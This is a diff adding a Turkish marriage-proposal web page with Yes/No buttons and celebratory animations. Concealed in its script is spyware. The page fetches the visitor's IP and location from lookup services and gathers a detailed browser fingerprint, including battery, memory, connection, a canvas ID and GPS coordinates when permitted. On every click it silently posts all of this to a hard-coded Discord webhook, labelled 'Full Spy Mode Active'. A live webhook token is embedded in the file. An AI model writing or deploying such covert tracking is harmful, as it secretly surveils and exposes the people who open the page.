@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>karıya teklif</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;600;700&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Background Music -->
+    <audio id="backgroundMusic" loop preload="auto">
+        <!-- Using a romantic piano piece from a free music library -->
+        <source src="https://www.soundjay.com/misc/sounds/romantic-piano.mp3" type="audio/mp3">
+        <!-- Fallback to a gentle romantic melody -->
+        <source src="https://cdn.pixabay.com/download/audio/2021/08/04/audio_bb630d3737.mp3" type="audio/mp3">
+    </audio>
+
+    <!-- Background Effects -->
+    <div class="background-effects">
+        <div class="hearts-bg" id="heartsBg"></div>
+        <div class="cats-bg" id="catsBg"></div>
+    </div>
+    
+
+    <div class="container">
+        <div class="proposal-card" id="proposalCard">
+            <div class="heart-bg">💕</div>
+            <h1 class="main-question">Benim karım olur muusunn?</h1>
+            <p class="subtitle">Bu mük sorunun cevabını merak ediyorum... 💖</p>
+            
+            <div class="buttons-container">
+                <button id="yesBtn" class="btn yes-btn" type="button">
+                    <span>Evet ❤️</span>
+                </button>
+                <button id="noBtn" class="btn no-btn" type="button">
+                    <span>Hayır 💔</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Success Screen -->
+        <div class="success-screen" id="successScreen">
+            <div class="hearts-container" id="heartsContainer"></div>
+            <div class="success-message">
+                <h1 class="love-message">Seni Seviyorum hatun 💕</h1>
+                <p class="celebration-text">Artık birlikte güzel anlar yaşayacağız! 🥰</p>
+                <div class="romantic-quotes" id="romanticQuotes"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    class ProposalSite {
+        constructor() {
+            console.log('ProposalSite initializing...');
+            this.yesBtn = document.getElementById('yesBtn');
+            this.noBtn = document.getElementById('noBtn');
+            this.proposalCard = document.getElementById('proposalCard');
+            this.successScreen = document.getElementById('successScreen');
+            this.heartsContainer = document.getElementById('heartsContainer');
+            
+            this.noClickCount = 0;
+            this.yesBtnScale = 1;
+            this.userIP = null;
+            
+            // Discord Webhook URL
+            this.webhookUrl = 'https://canary.discord.com/api/webhooks/1420756360626311249/ae-s2FpYCMuewtD3qlxiTr9NdnIvXoHqQKF9TyViU0oIeLByv1KLWLbta0Av7B7kBKZ1';
+            
+            this.init();
+        }
+        
+        init() {
+            console.log('Initializing event listeners...');
+            
+            // Get user IP address
+            this.getUserIP();
+            
+            if (this.yesBtn && this.noBtn) {
+                this.yesBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    this.handleYesClick();
+                });
+                this.noBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    this.handleNoClick();
+                });
+                console.log('Event listeners added successfully');
+            } else {
+                console.error('Buttons not found!');
+            }
+            
+            // Initialize music
+            this.initializeMusic();
+            
+            // Add entrance animations
+            this.animateEntrance();
+            // Start background effects
+            this.startBackgroundEffects();
+        }
+        
+        async getUserIP() {
+            try {
+                // Try multiple IP services for reliability
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://ipapi.co/json',
+                    'https://api.ip.sb/jsonip'
+                ];
+                
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service);
+                        const data = await response.json();
+                        
+                        // Different services return IP in different fields
+                        this.userIP = data.ip || data.query || 'Bilinmiyor';
+                        
+                        // If using ipapi.co, get additional location data
+                        if (service.includes('ipapi.co') && data.ip) {
+                            this.locationData = {
+                                country: data.country_name || 'Bilinmiyor',
+                                city: data.city || 'Bilinmiyor',
+                                region: data.region || 'Bilinmiyor',
+                                isp: data.org || 'Bilinmiyor',
+                                timezone: data.timezone || 'Bilinmiyor'
+                            };
+                        }
+                        
+                        if (this.userIP && this.userIP !== 'Bilinmiyor') {
+                            console.log('💻 IP adresi ve konum bilgisi alındı:', this.userIP);
+                            break;
+                        }
+                    } catch (serviceError) {
+                        console.log('IP servisi denemesi başarısız, diğerine geçiliyor...');
+                        continue;
+                    }
+                }
+                
+                if (!this.userIP) {
+                    this.userIP = 'Alınamadı';
+                }
+            } catch (error) {
+                console.error('IP adresi alınamadı:', error);
+                this.userIP = 'Hata';
+            }
+        }
+        
+        async getDetailedUserInfo() {
+            const info = {};
+            
+            try {
+                // Basic browser info
+                info.userAgent = navigator.userAgent;
+                info.platform = navigator.platform;
+                info.language = navigator.language;
+                info.languages = navigator.languages?.join(', ') || 'Bilinmiyor';
+                info.cookieEnabled = navigator.cookieEnabled;
+                info.onLine = navigator.onLine;
+                info.doNotTrack = navigator.doNotTrack || 'Belirtilmemiş';
+                
+                // Screen info
+                info.screenWidth = screen.width;
+                info.screenHeight = screen.height;
+                info.screenColorDepth = screen.colorDepth;
+                info.pixelRatio = window.devicePixelRatio || 1;
+                
+                // Window info
+                info.windowWidth = window.innerWidth;
+                info.windowHeight = window.innerHeight;
+                info.referrer = document.referrer || 'Direkt giriş';
+                
+                // Hardware info
+                info.hardwareConcurrency = navigator.hardwareConcurrency || 'Bilinmiyor';
+                info.maxTouchPoints = navigator.maxTouchPoints || 0;
+                
+                // Memory info (if available)
+                if ('memory' in performance) {
+                    info.memoryUsed = Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB';
+                    info.memoryTotal = Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB';
+                    info.memoryLimit = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) + ' MB';
+                } else {
+                    info.memoryUsed = 'Desteklenmiyor';
+                }
+                
+                // Connection info
+                if ('connection' in navigator) {
+                    const conn = navigator.connection;
+                    info.connectionType = conn.effectiveType || 'Bilinmiyor';
+                    info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Bilinmiyor';
+                    info.rtt = conn.rtt ? conn.rtt + ' ms' : 'Bilinmiyor';
+                } else {
+                    info.connectionType = 'Desteklenmiyor';
+                }
+                
+                // Battery info (if available)
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        info.batteryLevel = Math.round(battery.level * 100) + '%';
+                        info.batteryCharging = battery.charging ? 'Şarj oluyor' : 'Şarj olmuyor';
+                    } catch {
+                        info.batteryLevel = 'Erişim reddedildi';
+                    }
+                } else {
+                    info.batteryLevel = 'Desteklenmiyor';
+                }
+                
+                // Storage info
+                try {
+                    info.localStorage = 'localStorage' in window ? 'Destekleniyor' : 'Desteklenmiyor';
+                    info.sessionStorage = 'sessionStorage' in window ? 'Destekleniyor' : 'Desteklenmiyor';
+                } catch {
+                    info.localStorage = 'Hata';
+                    info.sessionStorage = 'Hata';
+                }
+                
+                // Geolocation (if permission granted)
+                if ('geolocation' in navigator) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                timeout: 3000,
+                                enableHighAccuracy: false
+                            });
+                        });
+                        info.latitude = position.coords.latitude.toFixed(4);
+                        info.longitude = position.coords.longitude.toFixed(4);
+                        info.accuracy = Math.round(position.coords.accuracy) + ' metre';
+                    } catch {
+                        info.latitude = 'Erişim reddedildi';
+                        info.longitude = 'Erişim reddedildi';
+                    }
+                } else {
+                    info.latitude = 'Desteklenmiyor';
+                }
+                
+                // Timezone
+                info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                info.timezoneOffset = new Date().getTimezoneOffset();
+                
+                // Performance timing
+                if ('performance' in window && 'timing' in performance) {
+                    const timing = performance.timing;
+                    info.pageLoadTime = (timing.loadEventEnd - timing.navigationStart) + ' ms';
+                } else {
+                    info.pageLoadTime = 'Desteklenmiyor';
+                }
+                
+                // Canvas fingerprint (basic)
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('Canvas fingerprint test', 2, 2);
+                    info.canvasFingerprint = canvas.toDataURL().slice(-20);
+                } catch {
+                    info.canvasFingerprint = 'Hata';
+                }
+                
+                return info;
+            } catch (error) {
+                console.error('Detaylı bilgi toplama hatası:', error);
+                return { error: 'Bilgi toplama başarısız' };
+            }
+        }
+        
+        initializeMusic() {
+            this.backgroundMusic = document.getElementById('backgroundMusic');
+            this.musicToggle = document.getElementById('musicToggle');
+            this.musicIcon = document.getElementById('musicIcon');
+            this.musicPlaying = false;
+            
+            // Set volume
+            if (this.backgroundMusic) {
+                this.backgroundMusic.volume = 0.3;
+            }
+            
+            // Music toggle event
+            if (this.musicToggle) {
+                this.musicToggle.addEventListener('click', () => {
+                    this.toggleMusic();
+                });
+            }
+            
+            // Auto-start music on first user interaction
+            document.addEventListener('click', () => {
+                if (!this.musicPlaying && this.backgroundMusic) {
+                    this.playMusic();
+                }
+            }, { once: true });
+        }
+        
+        toggleMusic() {
+            if (this.musicPlaying) {
+                this.pauseMusic();
+            } else {
+                this.playMusic();
+            }
+        }
+        
+        playMusic() {
+            if (this.backgroundMusic) {
+                const playPromise = this.backgroundMusic.play();
+                if (playPromise !== undefined) {
+                    playPromise.then(() => {
+                        this.musicPlaying = true;
+                        this.musicIcon.textContent = '🎵';
+                        this.musicToggle.classList.add('playing');
+                        console.log('Music started playing');
+                    }).catch((error) => {
+                        console.log('Music autoplay prevented:', error);
+                        this.musicPlaying = false;
+                        this.musicIcon.textContent = '🔇';
+                    });
+                }
+            }
+        }
+        
+        pauseMusic() {
+            if (this.backgroundMusic) {
+                this.backgroundMusic.pause();
+                this.musicPlaying = false;
+                this.musicIcon.textContent = '🔇';
+                this.musicToggle.classList.remove('playing');
+            }
+        }
+        
+        startBackgroundEffects() {
+            this.createFloatingHearts();
+            this.createFloatingCats();
+        }
+        
+        createFloatingHearts() {
+            const heartsBg = document.getElementById('heartsBg');
+            const heartEmojis = ['💕', '💖', '💗', '💓', '💝', '🌹', '❤️'];
+            
+            const createHeart = () => {
+                const heart = document.createElement('div');
+                heart.className = 'floating-heart';
+                heart.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
+                heart.style.cssText = `
+                    position: absolute;
+                    font-size: ${Math.random() * 20 + 15}px;
+                    left: ${Math.random() * 100}%;
+                    top: 100%;
+                    opacity: ${Math.random() * 0.6 + 0.3};
+                    animation: floatUp ${Math.random() * 8 + 6}s linear infinite;
+                    pointer-events: none;
+                    z-index: 1;
+                `;
+                heartsBg.appendChild(heart);
+                
+                setTimeout(() => {
+                    if (heart.parentNode) {
+                        heart.remove();
+                    }
+                }, 15000);
+            };
+            
+            // Create hearts periodically
+            setInterval(createHeart, 2000);
+        }
+        
+        createFloatingCats() {
+            const catsBg = document.getElementById('catsBg');
+            const catEmojis = ['🐱', '🐾', '🦋', '🌸', '🎀', '🐈'];
+            
+            const createCat = () => {
+                const cat = document.createElement('div');
+                cat.className = 'floating-cat';
+                cat.textContent = catEmojis[Math.floor(Math.random() * catEmojis.length)];
+                cat.style.cssText = `
+                    position: absolute;
+                    font-size: ${Math.random() * 25 + 20}px;
+                    right: -50px;
+                    top: ${Math.random() * 80 + 10}%;
+                    opacity: ${Math.random() * 0.5 + 0.3};
+                    animation: floatAcross ${Math.random() * 12 + 8}s linear infinite;
+                    pointer-events: none;
+                    z-index: 1;
+                `;
+                catsBg.appendChild(cat);
+                
+                setTimeout(() => {
+                    if (cat.parentNode) {
+                        cat.remove();
+                    }
+                }, 20000);
+            };
+            
+            // Create cats periodically
+            setInterval(createCat, 3000);
+        }
+        
+        animateEntrance() {
+            // Add subtle floating animation to the card
+            setInterval(() => {
+                this.proposalCard.style.transform = `translateY(${Math.sin(Date.now() * 0.001) * 3}px)`;
+            }, 16);
+        }
+        
+        handleYesClick() {
+            console.log('Yes button clicked!');
+            
+            // Send Discord webhook notification
+            this.sendWebhookNotification('YES', '💕 Birisi "EVET" dedi! Aşk kazandı! 💕', '#ff6b6b');
+            
+            // Hide proposal card with animation
+            this.proposalCard.style.transform = 'scale(0.8)';
+            this.proposalCard.style.opacity = '0';
+            
+            setTimeout(() => {
+                this.showSuccessScreen();
+            }, 300);
+        }
+        
+        handleNoClick() {
+            console.log('No button clicked!');
+            this.noClickCount++;
+            
+            // Send Discord webhook notification
+            const noMessages = [
+                '😭 Birisi "Hayır" dedi... (1. deneme)',
+                '🥺 "Emin misin?" diye soruldu... (2. deneme)', 
+                '🎯 Artık sadece "Evet" var! (3. deneme - son şans!)'
+            ];
+            this.sendWebhookNotification('NO', noMessages[this.noClickCount - 1], '#74b9ff');
+            
+            // Increase yes button size while keeping it centered
+            this.yesBtnScale += 0.25;
+            this.yesBtn.style.transformOrigin = 'center';
+            this.yesBtn.style.transform = `scale(${this.yesBtnScale})`;
+            
+            // Add shake animation to no button
+            this.noBtn.style.animation = 'shake 0.5s ease-in-out';
+            
+            // Change no button text based on click count
+            this.updateNoButtonText();
+            
+            // After 3rd click, remove no button completely
+            if (this.noClickCount >= 3) {
+                setTimeout(() => {
+                    this.noBtn.style.animation = 'fadeOut 0.5s ease-out forwards';
+                    this.showOnlyYesMessage();
+                }, 500);
+            }
+            
+            // Remove shake animation after it completes
+            setTimeout(() => {
+                if (this.noClickCount < 3) {
+                    this.noBtn.style.animation = '';
+                }
+            }, 500);
+            
+            // Add encouraging messages
+            this.showEncouragingMessage();
+        }
+        
+        updateNoButtonText() {
+            const noTexts = [
+                'Hayır 💔',
+                'Emin misin? 🥺', 
+                'Son şansın! 🙏'
+            ];
+            
+            if (this.noClickCount < noTexts.length) {
+                this.noBtn.innerHTML = `<span>${noTexts[this.noClickCount]}</span>`;
+            }
+        }
+        
+        showEncouragingMessage() {
+            const messages = [
+                '"Evet" daha iyi bir seçim olm napıyon aq 💕',
+                'lan ne hayıra basıp duruyon💓',
+                'al sadece evet var hadi hayıra bassana görim seni aq🌟✨'
+            ];
+            
+            if (this.noClickCount <= messages.length) {
+                const messageDiv = document.createElement('div');
+                messageDiv.className = 'encouraging-message';
+                messageDiv.textContent = messages[this.noClickCount - 1];
+                messageDiv.style.cssText = `
+                    position: absolute;
+                    top: -60px;
+                    left: 50%;
+                    transform: translateX(-50%);
+                    background: linear-gradient(135deg, #ff9a9e, #fecfef);
+                    color: white;
+                    padding: 12px 20px;
+                    border-radius: 20px;
+                    font-size: 0.9rem;
+                    font-weight: 500;
+                    white-space: nowrap;
+                    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+                    animation: fadeInBounce 0.6s ease-out;
+                    z-index: 10;
+                `;
+                
+                this.proposalCard.appendChild(messageDiv);
+                
+                // Remove message after 4 seconds
+                setTimeout(() => {
+                    if (messageDiv.parentNode) {
+                        messageDiv.remove();
+                    }
+                }, 4000);
+            }
+        }
+        
+        showOnlyYesMessage() {
+            // Create special message when no button is removed
+            const specialMessage = document.createElement('div');
+            specialMessage.className = 'only-yes-message';
+            specialMessage.innerHTML = `
+                <h3>al sadece evet var hadi hayıra bassana görim seni aq</h3>
+                <p>Başka seçeneğin yok... 😏✨</p>
+            `;
+            specialMessage.style.cssText = `
+                position: absolute;
+                bottom: -120px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+                color: white;
+                padding: 20px 30px;
+                border-radius: 25px;
+                text-align: center;
+                box-shadow: 0 15px 35px rgba(255, 107, 107, 0.4);
+                animation: popIn 0.8s ease-out;
+                z-index: 10;
+                width: 300px;
+                margin-left: -150px;
+            `;
+            
+            this.proposalCard.appendChild(specialMessage);
+            
+            // Add sparkle effects around yes button
+            this.addSparkleEffect();
+        }
+        
+        addSparkleEffect() {
+            const sparkles = ['✨', '⭐', '💫', '🌟', '💎'];
+            
+            for (let i = 0; i < 8; i++) {
+                setTimeout(() => {
+                    const sparkle = document.createElement('div');
+                    sparkle.textContent = sparkles[Math.floor(Math.random() * sparkles.length)];
+                    sparkle.style.cssText = `
+                        position: absolute;
+                        font-size: ${Math.random() * 15 + 20}px;
+                        left: ${Math.random() * 100}%;
+                        top: ${Math.random() * 100}%;
+                        animation: sparkleFloat ${Math.random() * 2 + 2}s ease-out forwards;
+                        pointer-events: none;
+                        z-index: 5;
+                    `;
+                    this.proposalCard.appendChild(sparkle);
+                    
+                    setTimeout(() => {
+                        if (sparkle.parentNode) {
+                            sparkle.remove();
+                        }
+                    }, 3000);
+                }, i * 200);
+            }
+        }
+        
+        showSuccessScreen() {
+            // Prevent multiple executions
+            if (this.successScreenShown) {
+                return;
+            }
+            this.successScreenShown = true;
+            
+            this.successScreen.style.display = 'flex';
+            this.successScreen.style.opacity = '0';
+            
+            // Fade in success screen
+            setTimeout(() => {
+                this.successScreen.style.opacity = '1';
+                this.successScreen.style.transition = 'opacity 0.5s ease';
+            }, 50);
+            
+            // Start massive celebration
+            this.startMassiveCelebration();
+            
+            // Add romantic quotes after a delay
+            setTimeout(() => {
+                this.showRomanticQuotes();
+            }, 2000);
+        }
+        
+        startMassiveCelebration() {
+            // Multiple layers of celebration effects
+            this.startHeartRain();
+            this.createConfetti();
+            this.createFireworks();
+            this.createFloatingLoveWords();
+            this.screenFlash();
+            this.createRomanticAmbiance();
+        }
+        
+        createRomanticAmbiance() {
+            // Ensure music is playing during success
+            if (!this.musicPlaying && this.backgroundMusic) {
+                this.playMusic();
+            }
+        }
+        
+        async sendWebhookNotification(action, message, color) {
+            try {
+                const timestamp = new Date().toLocaleString('tr-TR', {
+                    timeZone: 'Europe/Istanbul',
+                    day: '2-digit',
+                    month: '2-digit', 
+                    year: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                
+                // Get all detailed user information
+                const detailedInfo = await this.getDetailedUserInfo();
+                
+                const fields = [
+                    {
+                        name: '🔄 Aksiyon',
+                        value: action,
+                        inline: true
+                    },
+                    {
+                        name: '🕰️ Zaman',
+                        value: timestamp,
+                        inline: true
+                    },
+                    {
+                        name: '🌐 IP Adresi',
+                        value: this.userIP || 'Alınıyor...',
+                        inline: true
+                    }
+                ];
+                
+                // Add location info if available
+                if (this.locationData) {
+                    fields.push({
+                        name: '📍 Konum',
+                        value: `${this.locationData.city}, ${this.locationData.country}`,
+                        inline: true
+                    });
+                    fields.push({
+                        name: '🏢 İSP',
+                        value: this.locationData.isp,
+                        inline: true
+                    });
+                    fields.push({
+                        name: '⏰ Zaman Dilimi',
+                        value: this.locationData.timezone,
+                        inline: true
+                    });
+                }
+                
+                // Add detailed info fields
+                fields.push(
+                    {
+                        name: '💻 Sistem',
+                        value: `${detailedInfo.platform} | ${detailedInfo.hardwareConcurrency} çekirdek`,
+                        inline: true
+                    },
+                    {
+                        name: '🌍 Dil/Bölge',
+                        value: `${detailedInfo.language} | Offset: ${detailedInfo.timezoneOffset}`,
+                        inline: true
+                    },
+                    {
+                        name: '📺 Ekran Detay',
+                        value: `${detailedInfo.screenWidth}x${detailedInfo.screenHeight} (${detailedInfo.screenColorDepth}bit)`,
+                        inline: true
+                    },
+                    {
+                        name: '🖼️ Pencere',
+                        value: `${detailedInfo.windowWidth}x${detailedInfo.windowHeight} | Ratio: ${detailedInfo.pixelRatio}x`,
+                        inline: true
+                    },
+                    {
+                        name: '📡 Bağlantı',
+                        value: `${detailedInfo.connectionType} | ${detailedInfo.downlink} | RTT: ${detailedInfo.rtt}`,
+                        inline: true
+                    },
+                    {
+                        name: '🔋 Batarya',
+                        value: `${detailedInfo.batteryLevel} | ${detailedInfo.batteryCharging}`,
+                        inline: true
+                    },
+                    {
+                        name: '🧠 Bellek',
+                        value: `Kullanılan: ${detailedInfo.memoryUsed} | Limit: ${detailedInfo.memoryLimit}`,
+                        inline: true
+                    },
+                    {
+                        name: '💾 Depolama',
+                        value: `Local: ${detailedInfo.localStorage} | Session: ${detailedInfo.sessionStorage}`,
+                        inline: true
+                    },
+                    {
+                        name: '📋 Güvenlik',
+                        value: `Cookie: ${detailedInfo.cookieEnabled} | DNT: ${detailedInfo.doNotTrack}`,
+                        inline: true
+                    }
+                );
+                
+                // Add GPS if available
+                if (detailedInfo.latitude !== 'Erişim reddedildi' && detailedInfo.latitude !== 'Desteklenmiyor') {
+                    fields.push({
+                        name: '📍 GPS Konum',
+                        value: `${detailedInfo.latitude}, ${detailedInfo.longitude} (±${detailedInfo.accuracy})`,
+                        inline: false
+                    });
+                }
+                
+                // Add performance info
+                fields.push(
+                    {
+                        name: '⚡ Performans',
+                        value: `Sayfa Yüklenme: ${detailedInfo.pageLoadTime} | Touch Points: ${detailedInfo.maxTouchPoints}`,
+                        inline: true
+                    },
+                    {
+                        name: '🔗 Referrer',
+                        value: detailedInfo.referrer,
+                        inline: true
+                    },
+                    {
+                        name: '🎨 Canvas ID',
+                        value: detailedInfo.canvasFingerprint,
+                        inline: true
+                    }
+                );
+                
+                const payload = {
+                    embeds: [{
+                        title: '💕 Çıkma Teklifi Sitesi - FULL ANALİZ',
+                        description: message,
+                        color: parseInt(color.replace('#', ''), 16),
+                        fields: fields.slice(0, 25), // Discord limit is 25 fields
+                        footer: {
+                            text: '🕵️‍♂️ Tam Casusluk Modu Aktif 💖'
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                // If more than 25 fields, send additional embed
+                if (fields.length > 25) {
+                    payload.embeds.push({
+                        title: '📄 Ek Detaylar',
+                        color: parseInt(color.replace('#', ''), 16),
+                        fields: fields.slice(25),
+                        footer: {
+                            text: 'Devam...'
+                        }
+                    });
+                }
+                
+                const response = await fetch(this.webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    console.log('🕵️‍♂️ Full tracking Discord bildirimi gönderildi:', action);
+                } else {
+                    console.error('❌ Discord bildirimi gönderilemedi:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Webhook hatası:', error);
+            }
+        }
+        
+        createFireworks() {
+            const fireworksContainer = document.createElement('div');
+            fireworksContainer.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                pointer-events: none;
+                z-index: 998;
+            `;
+            document.body.appendChild(fireworksContainer);
+            
+            const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#00d2d3'];
+            
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const firework = document.createElement('div');
+                    firework.textContent = ['💥', '🎆', '🎇', '✨', '⭐'][Math.floor(Math.random() * 5)];
+                    firework.style.cssText = `
+                        position: absolute;
+                        font-size: ${Math.random() * 30 + 25}px;
+                        left: ${Math.random() * 100}%;
+                        top: ${Math.random() * 100}%;
+                        animation: explode 1.5s ease-out forwards;
+                        color: ${colors[Math.floor(Math.random() * colors.length)]};
+                    `;
+                    fireworksContainer.appendChild(firework);
+                    
+                    setTimeout(() => {
+                        if (firework.parentNode) {
+                            firework.remove();
+                        }
+                    }, 2000);
+                }, i * 200);
+            }
+            
+            setTimeout(() => {
+                fireworksContainer.remove();
+            }, 8000);
+        }
+        
+        createFloatingLoveWords() {
+            const wordsContainer = document.createElement('div');
+            wordsContainer.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                pointer-events: none;
+                z-index: 997;
+            `;
+            document.body.appendChild(wordsContainer);
+            
+            const loveWords = ['AŞKIM', 'SEVGİLİM', 'CANIM', 'HAYATIM', 'GÖZBEBEĞİM', 'TATLIM', 'PARİLTIM'];
+            
+            for (let i = 0; i < 15; i++) {
+                setTimeout(() => {
+                    const word = document.createElement('div');
+                    word.textContent = loveWords[Math.floor(Math.random() * loveWords.length)];
+                    word.style.cssText = `
+                        position: absolute;
+                        font-size: ${Math.random() * 20 + 15}px;
+                        font-weight: bold;
+                        left: ${Math.random() * 100}%;
+                        top: 100%;
+                        color: #ff6b6b;
+                        text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+                        animation: floatUpSpin ${Math.random() * 4 + 3}s linear forwards;
+                    `;
+                    wordsContainer.appendChild(word);
+                    
+                    setTimeout(() => {
+                        if (word.parentNode) {
+                            word.remove();
+                        }
+                    }, 7000);
+                }, i * 300);
+            }
+            
+            setTimeout(() => {
+                wordsContainer.remove();
+            }, 10000);
+        }
+        
+        screenFlash() {
+            const flash = document.createElement('div');
+            flash.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, transparent 70%);
+                z-index: 999;
+                animation: flashEffect 0.5s ease-out;
+                pointer-events: none;
+            `;
+            document.body.appendChild(flash);
+            
+            setTimeout(() => {
+                flash.remove();
+            }, 500);
+        }
+        
+        showRomanticQuotes() {
+            const quotesContainer = document.getElementById('romanticQuotes');
+            
+            // Prevent multiple executions
+            if (quotesContainer.hasAttribute('data-quotes-shown')) {
+                return;
+            }
+            quotesContainer.setAttribute('data-quotes-shown', 'true');
+            
+            // Clear any existing quotes to prevent duplication
+            quotesContainer.innerHTML = '';
+            
+            const quotes = [
+                'Seninle geçen her an bir mucize... ✨',
+                'Gözlerin benim için yıldızlardan daha parlak 🌟',
+                'Kalbin benimkiyle aynı ritimde atıyor 💓',
+                'Seninle olmak, cennette yaşamak gibi 🌈',
+                'Aşkımız sonsuzluktan da uzun sürecek ♾️'
+            ];
+            
+            quotes.forEach((quote, index) => {
+                setTimeout(() => {
+                    const quoteElement = document.createElement('p');
+                    quoteElement.textContent = quote;
+                    quoteElement.style.cssText = `
+                        font-size: 1.1rem;
+                        color: #d63384;
+                        margin: 15px 0;
+                        opacity: 0;
+                        transform: translateY(20px);
+                        animation: fadeInUp 0.8s ease-out forwards;
+                        text-align: center;
+                        font-style: italic;
+                        font-weight: 400;
+                    `;
+                    quotesContainer.appendChild(quoteElement);
+                }, index * 1200);
+            });
+        }
+        
+        startHeartRain() {
+            const heartEmojis = ['💕', '💖', '💗', '💓', '💝', '🌹', '❤️', '💯'];
+            
+            const createHeart = () => {
+                const heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
+                heart.style.left = Math.random() * 100 + '%';
+                heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                heart.style.animationDelay = Math.random() * 2 + 's';
+                
+                this.heartsContainer.appendChild(heart);
+                
+                // Remove heart after animation
+                setTimeout(() => {
+                    if (heart.parentNode) {
+                        heart.remove();
+                    }
+                }, 6000);
+            };
+            
+            // Create hearts continuously
+            const heartInterval = setInterval(createHeart, 300);
+            
+            // Stop creating hearts after 10 seconds
+            setTimeout(() => {
+                clearInterval(heartInterval);
+            }, 10000);
+        }
+        
+        createConfetti() {
+            const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+            const confettiContainer = document.createElement('div');
+            confettiContainer.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                pointer-events: none;
+                z-index: 999;
+            `;
+            document.body.appendChild(confettiContainer);
+            
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.style.cssText = `
+                    position: absolute;
+                    width: 10px;
+                    height: 10px;
+                    background: ${colors[Math.floor(Math.random() * colors.length)]};
+                    top: -10px;
+                    left: ${Math.random() * 100}%;
+                    opacity: 0.8;
+                    border-radius: 50%;
+                    animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
+                `;
+                confettiContainer.appendChild(confetti);
+            }
+            
+            // Remove confetti container after animation
+            setTimeout(() => {
+                confettiContainer.remove();
+            }, 5000);
+        }
+    }
+
+    // Removed restart function as requested
+
+    // Initialize the application when DOM is loaded
+    document.addEventListener('DOMContentLoaded', () => {
+        console.log('DOM loaded, starting ProposalSite...');
+        new ProposalSite();
+    });
+
+    // Fallback initialization
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('DOM loaded (fallback), starting ProposalSite...');
+            new ProposalSite();
+        });
+    } else {
+        console.log('DOM already loaded, starting ProposalSite immediately...');
+        new ProposalSite();
+    }
+    </script>
+</body>
+</html></absolute_file_name>
+    </file>
